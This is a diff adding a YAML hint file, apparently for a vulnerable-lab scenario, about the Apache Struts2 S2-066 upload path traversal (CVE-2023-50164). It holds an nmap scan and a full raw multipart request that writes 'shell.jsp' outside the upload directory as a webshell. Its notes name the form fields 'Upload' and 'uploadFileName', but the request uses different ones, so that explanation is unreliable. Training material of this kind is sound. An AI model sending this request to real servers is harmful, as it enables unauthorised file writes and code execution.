@@ -1,0 +1,151 @@
+# Optional ScenarioForge guide hints; derived from the adjacent public Vulhub documentation.
+schema_version: 1
+match: struts2/s2-066
+cve: CVE-2023-50164
+hint_levels:
+  low:
+  - Inspect the struts2 service or application on {{NODE_NAME}} @ {{NODE_IP}}.
+  medium:
+  - |-
+    Catalog TCP ports: 5005,8080. Identify the exposed services:
+
+    ```bash
+    nmap -Pn -sT -sV -p 5005,8080 {{NODE_IP}}
+    ```
+  - 'Catalog port mappings (published → container): struts2: 8080/tcp → container 8080/tcp; struts2: 5005/tcp →
+    container 5005/tcp. These are recipe defaults; use the deployed service port if the scenario remaps it.'
+  - 'Documented target URL(s): `http://{{NODE_IP}}:8080`, `http://{{NODE_IP}}:8080/shell.jsp`.'
+  high:
+  - |-
+    Vulnerability: Struts2 S2-066 Upload Path Traversal (CVE-2023-50164).
+
+    CVE record(s): https://www.cve.org/CVERecord?id=CVE-2023-50164
+  - Send the raw request examples with an HTTP client that recalculates Content-Length after target and payload
+    substitutions.
+  - |-
+    Vulnerability Reproduce
+
+    First, try to upload a JSP script to the normal upload directory:
+
+    Normal Upload: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/struts2/s2-066/1.png
+
+    Although the file is uploaded successfully, the JSP script cannot be executed in the upload directory due to server configuration:
+
+    Execution Failed: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/struts2/s2-066/2.png
+
+    Exploit the S2-066 vulnerability to upload the file outside the `upload/` directory using the following request:
+
+    ```
+    POST /index.action HTTP/1.1
+    Host: {{NODE_IP}}:8080
+    Accept-Encoding: gzip, deflate, br
+    Accept: */*
+    Accept-Language: en-US;q=0.9,en;q=0.8
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
+    Connection: close
+    Cache-Control: max-age=0
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryl6ZFZPznNSPZOFJF
+
+    ------WebKitFormBoundaryl6ZFZPznNSPZOFJF
+    Content-Disposition: form-data; name="File"; filename="shell.jsp"
+    Content-Type: text/plain
+
+    <%
+      out.println("hello world");
+    %>
+    ------WebKitFormBoundaryl6ZFZPznNSPZOFJF
+    Content-Disposition: form-data; name="fileFileName"
+
+    ../shell.jsp
+    ------WebKitFormBoundaryl6ZFZPznNSPZOFJF--
+    ```
+
+    Note the key elements in the exploit:
+
+    - The form field name is "Upload" (first letter uppercase)
+    - A separate "uploadFileName" field contains the path traversal "../shell.jsp"
+
+    Successful Upload: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/struts2/s2-066/3.png
+
+    The JSP file is now uploaded outside the restricted upload directory and can be executed:
+
+    Webshell Execution: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/struts2/s2-066/4.png
+
+    You can now access the webshell at `http://{{NODE_IP}}:8080/shell.jsp`.
+  - 'Publicly available documentation: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/struts2/s2-066/README.md'
+  - |-
+    Additional public references:
+    - https://cwiki.apache.org/confluence/display/WW/s2-066
+    - https://y4tacker.github.io/2023/12/09/year/2023/12/Apache-Struts2-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90-S2-066/
+access_instructions:
+  title: Struts2 S2-066 Upload Path Traversal (CVE-2023-50164)
+  steps:
+  - title: Locate the target service
+    instructions: |-
+      Catalog TCP ports: 5005,8080. Identify the exposed services:
+
+      ```bash
+      nmap -Pn -sT -sV -p 5005,8080 {{NODE_IP}}
+      ```
+
+      Catalog port mappings (published → container): struts2: 8080/tcp → container 8080/tcp; struts2: 5005/tcp → container 5005/tcp. These are recipe defaults; use the deployed service port if the scenario remaps it.
+
+      Documented target URL(s): `http://{{NODE_IP}}:8080`, `http://{{NODE_IP}}:8080/shell.jsp`.
+  - title: Vulnerability Reproduce
+    instructions: |-
+      First, try to upload a JSP script to the normal upload directory:
+
+      Normal Upload: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/struts2/s2-066/1.png
+
+      Although the file is uploaded successfully, the JSP script cannot be executed in the upload directory due to server configuration:
+
+      Execution Failed: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/struts2/s2-066/2.png
+
+      Exploit the S2-066 vulnerability to upload the file outside the `upload/` directory using the following request:
+
+      ```
+      POST /index.action HTTP/1.1
+      Host: {{NODE_IP}}:8080
+      Accept-Encoding: gzip, deflate, br
+      Accept: */*
+      Accept-Language: en-US;q=0.9,en;q=0.8
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
+      Connection: close
+      Cache-Control: max-age=0
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryl6ZFZPznNSPZOFJF
+
+      ------WebKitFormBoundaryl6ZFZPznNSPZOFJF
+      Content-Disposition: form-data; name="File"; filename="shell.jsp"
+      Content-Type: text/plain
+
+      <%
+        out.println("hello world");
+      %>
+      ------WebKitFormBoundaryl6ZFZPznNSPZOFJF
+      Content-Disposition: form-data; name="fileFileName"
+
+      ../shell.jsp
+      ------WebKitFormBoundaryl6ZFZPznNSPZOFJF--
+      ```
+
+      Note the key elements in the exploit:
+
+      - The form field name is "Upload" (first letter uppercase)
+      - A separate "uploadFileName" field contains the path traversal "../shell.jsp"
+
+      Successful Upload: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/struts2/s2-066/3.png
+
+      The JSP file is now uploaded outside the restricted upload directory and can be executed:
+
+      Webshell Execution: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/struts2/s2-066/4.png
+
+      You can now access the webshell at `http://{{NODE_IP}}:8080/shell.jsp`.
+guidance_source:
+  repository: https://github.com/vulhub/vulhub
+  snapshot_commit: 3af973a39bd0988f288a53fa9ea4b82372774e58
+  documentation_url: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/struts2/s2-066/README.md
+  readme_sha256: f72e4dd0fc23c353291679df6dac330e276e173c3e9e209dbf8b7c9e4fe1fd22
+  compose_sha256: 70175f435112d25245eb26178c47891443b8975241a2c52052a745ff05224d56
+  license: MIT; see vulnhub/content/LICENSE
+  method: Tiered discovery hints and adapted reproduction text from the local catalog snapshot. Reproduction commands
+    have not been executed.
